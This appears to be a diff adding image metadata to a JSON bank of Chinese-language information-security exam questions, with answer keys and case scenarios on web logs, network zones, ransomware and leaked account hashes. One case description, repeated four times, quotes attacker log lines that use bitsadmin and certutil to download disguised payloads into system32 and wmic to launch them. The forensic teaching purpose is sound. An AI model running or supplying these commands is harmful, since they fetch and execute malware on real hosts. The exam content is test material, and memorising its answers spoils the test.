@@ -175,6 +175,12 @@
       "type": "單選題",
       "answer": "C",
       "question_text": "依據下圖（Cookie: isRememberMe=YES&UserAccount=S1）所示之結果，此為 OWASP Top 10 – 2017 文件敘述的何項風險分類？",
+      "image": {
+        "src": "exam/images/108資訊安全防護實務/q12-request-cookie.png",
+        "alt": "HTTP Request 頁籤中的 RememberAccount Cookie 欄位",
+        "caption": "題目提供的 HTTP Request Cookie 設定畫面",
+        "source_page": 3
+      },
       "options": {
         "A": "Cross-Site Scripting（XSS）",
         "B": "XML External Entities（XXE）",
@@ -321,6 +327,32 @@
       "competency": "能規劃身分驗證與帳號生命週期",
       "case_group": {
         "id": "題組 1",
+        "images": [
+          {
+            "src": "exam/images/108資訊安全防護實務/q21-24-web-scan-log.png",
+            "alt": "網站弱點檢測紀錄片段",
+            "caption": "網站檢測報告中的 HTTP 存取紀錄",
+            "source_page": 5
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q21-24-database-transaction-log.png",
+            "alt": "資料庫交易紀錄中的命令輸出",
+            "caption": "資料庫交易紀錄內的檔案下載與程序執行命令",
+            "source_page": 6
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q21-24-iis-access-log.png",
+            "alt": "IIS Request 與 Response 存取紀錄",
+            "caption": "IIS Access Log 中的請求參數與回應狀態",
+            "source_page": 6
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q21-24-endpoint-backup-log.png",
+            "alt": "端點電腦中的資料庫備份紀錄",
+            "caption": "研發人員端點電腦上的資料庫備份紀錄",
+            "source_page": 6
+          }
+        ],
         "description": "某公司資安稽核部門進行年度檢視稽核，抽驗(1) Web 資安黑箱檢測報告、(2)資料庫紀錄、(3)資訊系統存取紀錄以及(4)研發人員端點電腦記錄，請就下列紀錄與報告內容關連性，回答相關問題：\n(1) 在網站檢測報告，在紅（高風險）橘（中風險）藍（低風險）綠（資訊性提列）燈分項下的藍燈報告中發現：2019-05-14 07:58:10 110.10.1.103 GET /1ogin.asp 443 - 10.10.10.100 mozilla/5.0+(Windows+NT+6.1;+rv:50.0)+Gecko/20100101+Firefox/50.0 200 8 12030 58\n(2) 在資料庫交易記錄中發現：Input_1> start bitsadmin /transfer 666 http://files.download.com/conceal1.jpg c:\\windows\\system32\\inject.dll ... Input_10> certutil.exe -urlcache -split -f http://files.download.com/conceal2.jpg Input_11> copy conceal2.jpg c:\\windows\\system32\\hacking.exe Input_12> wmic process call create C:\\Windows\\System32\\hacking.exe\n(3) 在 IIS Access Log 發現含有帳號密碼與 Script 標籤的請求。\n(4) 在研發人員端點電腦記錄發現資料庫備份與頁面傾印紀錄。"
       }
     },
@@ -340,6 +372,32 @@
       "competency": "能規劃身分驗證與帳號生命週期",
       "case_group": {
         "id": "題組 1",
+        "images": [
+          {
+            "src": "exam/images/108資訊安全防護實務/q21-24-web-scan-log.png",
+            "alt": "網站弱點檢測紀錄片段",
+            "caption": "網站檢測報告中的 HTTP 存取紀錄",
+            "source_page": 5
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q21-24-database-transaction-log.png",
+            "alt": "資料庫交易紀錄中的命令輸出",
+            "caption": "資料庫交易紀錄內的檔案下載與程序執行命令",
+            "source_page": 6
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q21-24-iis-access-log.png",
+            "alt": "IIS Request 與 Response 存取紀錄",
+            "caption": "IIS Access Log 中的請求參數與回應狀態",
+            "source_page": 6
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q21-24-endpoint-backup-log.png",
+            "alt": "端點電腦中的資料庫備份紀錄",
+            "caption": "研發人員端點電腦上的資料庫備份紀錄",
+            "source_page": 6
+          }
+        ],
         "description": "某公司資安稽核部門進行年度檢視稽核，抽驗(1) Web 資安黑箱檢測報告、(2)資料庫紀錄、(3)資訊系統存取紀錄以及(4)研發人員端點電腦記錄，請就下列紀錄與報告內容關連性，回答相關問題：\n(1) 在網站檢測報告，在紅（高風險）橘（中風險）藍（低風險）綠（資訊性提列）燈分項下的藍燈報告中發現：2019-05-14 07:58:10 110.10.1.103 GET /1ogin.asp 443 - 10.10.10.100 mozilla/5.0+(Windows+NT+6.1;+rv:50.0)+Gecko/20100101+Firefox/50.0 200 8 12030 58\n(2) 在資料庫交易記錄中發現：Input_1> start bitsadmin /transfer 666 http://files.download.com/conceal1.jpg c:\\windows\\system32\\inject.dll ... Input_10> certutil.exe -urlcache -split -f http://files.download.com/conceal2.jpg Input_11> copy conceal2.jpg c:\\windows\\system32\\hacking.exe Input_12> wmic process call create C:\\Windows\\System32\\hacking.exe\n(3) 在 IIS Access Log 發現含有帳號密碼與 Script 標籤的請求。\n(4) 在研發人員端點電腦記錄發現資料庫備份與頁面傾印紀錄。"
       }
     },
@@ -359,6 +417,32 @@
       "competency": "能規劃身分驗證與帳號生命週期",
       "case_group": {
         "id": "題組 1",
+        "images": [
+          {
+            "src": "exam/images/108資訊安全防護實務/q21-24-web-scan-log.png",
+            "alt": "網站弱點檢測紀錄片段",
+            "caption": "網站檢測報告中的 HTTP 存取紀錄",
+            "source_page": 5
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q21-24-database-transaction-log.png",
+            "alt": "資料庫交易紀錄中的命令輸出",
+            "caption": "資料庫交易紀錄內的檔案下載與程序執行命令",
+            "source_page": 6
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q21-24-iis-access-log.png",
+            "alt": "IIS Request 與 Response 存取紀錄",
+            "caption": "IIS Access Log 中的請求參數與回應狀態",
+            "source_page": 6
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q21-24-endpoint-backup-log.png",
+            "alt": "端點電腦中的資料庫備份紀錄",
+            "caption": "研發人員端點電腦上的資料庫備份紀錄",
+            "source_page": 6
+          }
+        ],
         "description": "某公司資安稽核部門進行年度檢視稽核，抽驗(1) Web 資安黑箱檢測報告、(2)資料庫紀錄、(3)資訊系統存取紀錄以及(4)研發人員端點電腦記錄，請就下列紀錄與報告內容關連性，回答相關問題：\n(1) 在網站檢測報告，在紅（高風險）橘（中風險）藍（低風險）綠（資訊性提列）燈分項下的藍燈報告中發現：2019-05-14 07:58:10 110.10.1.103 GET /1ogin.asp 443 - 10.10.10.100 mozilla/5.0+(Windows+NT+6.1;+rv:50.0)+Gecko/20100101+Firefox/50.0 200 8 12030 58\n(2) 在資料庫交易記錄中發現：Input_1> start bitsadmin /transfer 666 http://files.download.com/conceal1.jpg c:\\windows\\system32\\inject.dll ... Input_10> certutil.exe -urlcache -split -f http://files.download.com/conceal2.jpg Input_11> copy conceal2.jpg c:\\windows\\system32\\hacking.exe Input_12> wmic process call create C:\\Windows\\System32\\hacking.exe\n(3) 在 IIS Access Log 發現含有帳號密碼與 Script 標籤的請求。\n(4) 在研發人員端點電腦記錄發現資料庫備份與頁面傾印紀錄。"
       }
     },
@@ -378,6 +462,32 @@
       "competency": "能規劃身分驗證與帳號生命週期",
       "case_group": {
         "id": "題組 1",
+        "images": [
+          {
+            "src": "exam/images/108資訊安全防護實務/q21-24-web-scan-log.png",
+            "alt": "網站弱點檢測紀錄片段",
+            "caption": "網站檢測報告中的 HTTP 存取紀錄",
+            "source_page": 5
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q21-24-database-transaction-log.png",
+            "alt": "資料庫交易紀錄中的命令輸出",
+            "caption": "資料庫交易紀錄內的檔案下載與程序執行命令",
+            "source_page": 6
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q21-24-iis-access-log.png",
+            "alt": "IIS Request 與 Response 存取紀錄",
+            "caption": "IIS Access Log 中的請求參數與回應狀態",
+            "source_page": 6
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q21-24-endpoint-backup-log.png",
+            "alt": "端點電腦中的資料庫備份紀錄",
+            "caption": "研發人員端點電腦上的資料庫備份紀錄",
+            "source_page": 6
+          }
+        ],
         "description": "某公司資安稽核部門進行年度檢視稽核，抽驗(1) Web 資安黑箱檢測報告、(2)資料庫紀錄、(3)資訊系統存取紀錄以及(4)研發人員端點電腦記錄，請就下列紀錄與報告內容關連性，回答相關問題：\n(1) 在網站檢測報告，在紅（高風險）橘（中風險）藍（低風險）綠（資訊性提列）燈分項下的藍燈報告中發現：2019-05-14 07:58:10 110.10.1.103 GET /1ogin.asp 443 - 10.10.10.100 mozilla/5.0+(Windows+NT+6.1;+rv:50.0)+Gecko/20100101+Firefox/50.0 200 8 12030 58\n(2) 在資料庫交易記錄中發現：Input_1> start bitsadmin /transfer 666 http://files.download.com/conceal1.jpg c:\\windows\\system32\\inject.dll ... Input_10> certutil.exe -urlcache -split -f http://files.download.com/conceal2.jpg Input_11> copy conceal2.jpg c:\\windows\\system32\\hacking.exe Input_12> wmic process call create C:\\Windows\\System32\\hacking.exe\n(3) 在 IIS Access Log 發現含有帳號密碼與 Script 標籤的請求。\n(4) 在研發人員端點電腦記錄發現資料庫備份與頁面傾印紀錄。"
       }
     },
@@ -397,6 +507,20 @@
       "competency": "能選用密碼技術與金鑰管理控制",
       "case_group": {
         "id": "題組 2",
+        "images": [
+          {
+            "src": "exam/images/108資訊安全防護實務/q25-28-network-topology.png",
+            "alt": "Internet、DMZ、Intranet、Web Server、IPS、AP Server 與 DB Server 網路架構圖",
+            "caption": "題組 2 的網路區域與伺服器連線架構",
+            "source_page": 8
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q25-28-connection-log.png",
+            "alt": "DMZ Web Server 對 AP Server 的 HTTP 連線紀錄",
+            "caption": "題組 2 的連線與應用程式存取紀錄",
+            "source_page": 8
+          }
+        ],
         "description": "某公司因資安考量，重新規劃對外網站的連線架構，AP 與 DB Server 放在 Intranet，Reverse proxy（Web）放在 DMZ，對外 Web 連線使用 SSL 連線，AP 與 Reverse proxy 之間亦使用加密連線，而這幾台主機間的流量，都納入網路型 IPS 進行監控（該 IPS 目前僅有攻擊特徵偵測功能），DMZ/Internet/Intranet 間亦有防火牆進行連線控管。某天公司內的資安人員發現有人嘗試在攻擊對外網站 ， 在DMZ Web server 連線日誌中發現以下可疑的連線記錄"
       }
     },
@@ -416,6 +540,20 @@
       "competency": "能選用密碼技術與金鑰管理控制",
       "case_group": {
         "id": "題組 2",
+        "images": [
+          {
+            "src": "exam/images/108資訊安全防護實務/q25-28-network-topology.png",
+            "alt": "Internet、DMZ、Intranet、Web Server、IPS、AP Server 與 DB Server 網路架構圖",
+            "caption": "題組 2 的網路區域與伺服器連線架構",
+            "source_page": 8
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q25-28-connection-log.png",
+            "alt": "DMZ Web Server 對 AP Server 的 HTTP 連線紀錄",
+            "caption": "題組 2 的連線與應用程式存取紀錄",
+            "source_page": 8
+          }
+        ],
         "description": "某公司因資安考量，重新規劃對外網站的連線架構，AP 與 DB Server 放在 Intranet，Reverse proxy（Web）放在 DMZ，對外 Web 連線使用 SSL 連線，AP 與 Reverse proxy 之間亦使用加密連線，而這幾台主機間的流量，都納入網路型 IPS 進行監控（該 IPS 目前僅有攻擊特徵偵測功能），DMZ/Internet/Intranet 間亦有防火牆進行連線控管。某天公司內的資安人員發現有人嘗試在攻擊對外網站 ， 在DMZ Web server 連線日誌中發現以下可疑的連線記錄"
       }
     },
@@ -435,6 +573,20 @@
       "competency": "能選用密碼技術與金鑰管理控制",
       "case_group": {
         "id": "題組 2",
+        "images": [
+          {
+            "src": "exam/images/108資訊安全防護實務/q25-28-network-topology.png",
+            "alt": "Internet、DMZ、Intranet、Web Server、IPS、AP Server 與 DB Server 網路架構圖",
+            "caption": "題組 2 的網路區域與伺服器連線架構",
+            "source_page": 8
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q25-28-connection-log.png",
+            "alt": "DMZ Web Server 對 AP Server 的 HTTP 連線紀錄",
+            "caption": "題組 2 的連線與應用程式存取紀錄",
+            "source_page": 8
+          }
+        ],
         "description": "某公司因資安考量，重新規劃對外網站的連線架構，AP 與 DB Server 放在 Intranet，Reverse proxy（Web）放在 DMZ，對外 Web 連線使用 SSL 連線，AP 與 Reverse proxy 之間亦使用加密連線，而這幾台主機間的流量，都納入網路型 IPS 進行監控（該 IPS 目前僅有攻擊特徵偵測功能），DMZ/Internet/Intranet 間亦有防火牆進行連線控管。某天公司內的資安人員發現有人嘗試在攻擊對外網站 ， 在DMZ Web server 連線日誌中發現以下可疑的連線記錄"
       }
     },
@@ -454,6 +606,20 @@
       "competency": "能選用密碼技術與金鑰管理控制",
       "case_group": {
         "id": "題組 2",
+        "images": [
+          {
+            "src": "exam/images/108資訊安全防護實務/q25-28-network-topology.png",
+            "alt": "Internet、DMZ、Intranet、Web Server、IPS、AP Server 與 DB Server 網路架構圖",
+            "caption": "題組 2 的網路區域與伺服器連線架構",
+            "source_page": 8
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q25-28-connection-log.png",
+            "alt": "DMZ Web Server 對 AP Server 的 HTTP 連線紀錄",
+            "caption": "題組 2 的連線與應用程式存取紀錄",
+            "source_page": 8
+          }
+        ],
         "description": "某公司因資安考量，重新規劃對外網站的連線架構，AP 與 DB Server 放在 Intranet，Reverse proxy（Web）放在 DMZ，對外 Web 連線使用 SSL 連線，AP 與 Reverse proxy 之間亦使用加密連線，而這幾台主機間的流量，都納入網路型 IPS 進行監控（該 IPS 目前僅有攻擊特徵偵測功能），DMZ/Internet/Intranet 間亦有防火牆進行連線控管。某天公司內的資安人員發現有人嘗試在攻擊對外網站 ， 在DMZ Web server 連線日誌中發現以下可疑的連線記錄"
       }
     },
@@ -549,6 +715,12 @@
       "competency": "能選用密碼技術與金鑰管理控制",
       "case_group": {
         "id": "題組 4",
+        "image": {
+          "src": "exam/images/108資訊安全防護實務/q33-36-ransom-note.png",
+          "alt": "黑底紅字的加密勒索訊息畫面",
+          "caption": "Windows 主機重新啟動後顯示的檔案加密勒索訊息",
+          "source_page": 11
+        },
         "description": "組織 ABC 為金融監督管理委員會（金管會）管轄的關鍵基礎設施提供者，受到金管會核定為 A 級特定非公務機關，在一日的維運中，系統管理員 John 在操作核心線上系統時 ， 發現電腦突然重新開機且無法正常啟動 Windows 作業系統，並直接即出現下列畫面。"
       }
     },
@@ -568,6 +740,12 @@
       "competency": "能判讀資通安全法規與事件通報要求",
       "case_group": {
         "id": "題組 4",
+        "image": {
+          "src": "exam/images/108資訊安全防護實務/q33-36-ransom-note.png",
+          "alt": "黑底紅字的加密勒索訊息畫面",
+          "caption": "Windows 主機重新啟動後顯示的檔案加密勒索訊息",
+          "source_page": 11
+        },
         "description": "組織 ABC 為金融監督管理委員會（金管會）管轄的關鍵基礎設施提供者，受到金管會核定為 A 級特定非公務機關，在一日的維運中，系統管理員 John 在操作核心線上系統時 ， 發現電腦突然重新開機且無法正常啟動 Windows 作業系統，並直接即出現下列畫面。"
       }
     },
@@ -587,6 +765,12 @@
       "competency": "能判讀資通安全法規與事件通報要求",
       "case_group": {
         "id": "題組 4",
+        "image": {
+          "src": "exam/images/108資訊安全防護實務/q33-36-ransom-note.png",
+          "alt": "黑底紅字的加密勒索訊息畫面",
+          "caption": "Windows 主機重新啟動後顯示的檔案加密勒索訊息",
+          "source_page": 11
+        },
         "description": "組織 ABC 為金融監督管理委員會（金管會）管轄的關鍵基礎設施提供者，受到金管會核定為 A 級特定非公務機關，在一日的維運中，系統管理員 John 在操作核心線上系統時 ， 發現電腦突然重新開機且無法正常啟動 Windows 作業系統，並直接即出現下列畫面。"
       }
     },
@@ -606,6 +790,12 @@
       "competency": "能判讀資通安全法規與事件通報要求",
       "case_group": {
         "id": "題組 4",
+        "image": {
+          "src": "exam/images/108資訊安全防護實務/q33-36-ransom-note.png",
+          "alt": "黑底紅字的加密勒索訊息畫面",
+          "caption": "Windows 主機重新啟動後顯示的檔案加密勒索訊息",
+          "source_page": 11
+        },
         "description": "組織 ABC 為金融監督管理委員會（金管會）管轄的關鍵基礎設施提供者，受到金管會核定為 A 級特定非公務機關，在一日的維運中，系統管理員 John 在操作核心線上系統時 ， 發現電腦突然重新開機且無法正常啟動 Windows 作業系統，並直接即出現下列畫面。"
       }
     },
@@ -625,6 +815,20 @@
       "competency": "能判讀資通安全法規與事件通報要求",
       "case_group": {
         "id": "題組 5",
+        "images": [
+          {
+            "src": "exam/images/108資訊安全防護實務/q37-40-name-sid-table.png",
+            "alt": "Name 與 SID 對照表",
+            "caption": "acc.txt 中的本機帳號名稱與 SID 對照",
+            "source_page": 12
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q37-40-account-hashes.png",
+            "alt": "帳號名稱與雜湊字串列表",
+            "caption": "同一目錄另一檔案中的帳號與雜湊資料",
+            "source_page": 13
+          }
+        ],
         "description": "某日資安人員接獲通報，系統維運人員在某台 windows 主機上找到一個文字檔（acc.txt）內容如下，因為發現文字檔案”Name”欄位的資料與電腦帳號是雷同的，資安人員發現此文字檔中，含有該台主機之 administrator 權限的帳號"
       }
     },
@@ -644,6 +848,20 @@
       "competency": "能判讀資通安全法規與事件通報要求",
       "case_group": {
         "id": "題組 5",
+        "images": [
+          {
+            "src": "exam/images/108資訊安全防護實務/q37-40-name-sid-table.png",
+            "alt": "Name 與 SID 對照表",
+            "caption": "acc.txt 中的本機帳號名稱與 SID 對照",
+            "source_page": 12
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q37-40-account-hashes.png",
+            "alt": "帳號名稱與雜湊字串列表",
+            "caption": "同一目錄另一檔案中的帳號與雜湊資料",
+            "source_page": 13
+          }
+        ],
         "description": "某日資安人員接獲通報，系統維運人員在某台 windows 主機上找到一個文字檔（acc.txt）內容如下，因為發現文字檔案”Name”欄位的資料與電腦帳號是雷同的，資安人員發現此文字檔中，含有該台主機之 administrator 權限的帳號"
       }
     },
@@ -663,6 +881,20 @@
       "competency": "能判讀資通安全法規與事件通報要求",
       "case_group": {
         "id": "題組 5",
+        "images": [
+          {
+            "src": "exam/images/108資訊安全防護實務/q37-40-name-sid-table.png",
+            "alt": "Name 與 SID 對照表",
+            "caption": "acc.txt 中的本機帳號名稱與 SID 對照",
+            "source_page": 12
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q37-40-account-hashes.png",
+            "alt": "帳號名稱與雜湊字串列表",
+            "caption": "同一目錄另一檔案中的帳號與雜湊資料",
+            "source_page": 13
+          }
+        ],
         "description": "某日資安人員接獲通報，系統維運人員在某台 windows 主機上找到一個文字檔（acc.txt）內容如下，因為發現文字檔案”Name”欄位的資料與電腦帳號是雷同的，資安人員發現此文字檔中，含有該台主機之 administrator 權限的帳號"
       }
     },
@@ -682,6 +914,20 @@
       "competency": "能判讀資通安全法規與事件通報要求",
       "case_group": {
         "id": "題組 5",
+        "images": [
+          {
+            "src": "exam/images/108資訊安全防護實務/q37-40-name-sid-table.png",
+            "alt": "Name 與 SID 對照表",
+            "caption": "acc.txt 中的本機帳號名稱與 SID 對照",
+            "source_page": 12
+          },
+          {
+            "src": "exam/images/108資訊安全防護實務/q37-40-account-hashes.png",
+            "alt": "帳號名稱與雜湊字串列表",
+            "caption": "同一目錄另一檔案中的帳號與雜湊資料",
+            "source_page": 13
+          }
+        ],
         "description": "某日資安人員接獲通報，系統維運人員在某台 windows 主機上找到一個文字檔（acc.txt）內容如下，因為發現文字檔案”Name”欄位的資料與電腦帳號是雷同的，資安人員發現此文字檔中，含有該台主機之 administrator 權限的帳號"
       }
     }
